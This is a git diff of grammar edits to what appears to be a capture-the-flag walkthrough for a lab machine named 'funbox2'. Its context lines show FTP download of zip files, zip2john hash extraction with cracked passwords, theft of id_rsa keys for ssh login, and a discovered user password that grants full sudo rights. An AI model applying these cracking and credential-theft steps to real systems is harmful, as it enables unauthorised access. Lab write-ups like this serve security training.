@@ -139,10 +139,10 @@ Regards
 root
 ```
 
-> So there should be sensitive information inside the `zip` files.
+> So, there should be sensitive information inside the `zip` files.
 {: .prompt-info }
 
-In the next step we download every `zip` files.
+In the next step we download every `zip` file.
 ```bash
 ftp> get anna.zip
 local: anna.zip remote: anna.zip
@@ -215,7 +215,7 @@ local: zlatan.zip remote: zlatan.zip
 > The `zip` files are password protected.
 {: .prompt-danger }
 
-So, in the next step we use `zip2john` to generate the password hashes of the `zip` files and write them into a file named `hashes.txt`
+In the next step we use `zip2john` to generate the password hashes of the `zip` files and write them into a file named `hashes.txt`
 ```bash
 $ zip2john anna.zip > hashes.txt
 $ zip2john ariel.zip >> hashes.txt
@@ -248,7 +248,7 @@ Session completed.
 > We found two passwords! `tom.zip:iubire` and `cathrine.zip:catwoman`.
 {: .prompt-info }
 
-Lets unzip the `zip` files to get the `id_rsa` keys we probably can use to log in to the system.
+Lets unzip the `zip` files to get the `id_rsa` keys we probably can use to log into the system via `ssh`.
 ```bash
 $ unzip tom.zip         
 Archive:  tom.zip
@@ -341,7 +341,7 @@ tom@funbox2:~$ cd ..
 tom@funbox2:/home$
 ```
 
-> We know have a full `bash` shell :-)
+> We now have a full `bash` shell :-)
 {: .prompt-info }
 
 ## privilege escalation
@@ -386,7 +386,7 @@ quit
 > We found a password for the user tom! `tom:xx11yy22!`
 {: .prompt-info }
 
-We will now check if we are allowed to execute commands with `sudo` by using the found password.
+Lets check if we are allowed to execute commands with `sudo` by using the identified password.
 ```bash
 tom@funbox2:~$ sudo -l
 [sudo] password for tom: 
@@ -397,7 +397,7 @@ User tom may run the following commands on funbox2:
     (ALL : ALL) ALL
 ```
 
-> Yes! We are allowed to execute every command with `sudo`!
+> Yes! We are allowed to execute all commands with `sudo`!
 {: .prompt-info }
 
 Lets switch to user `root`
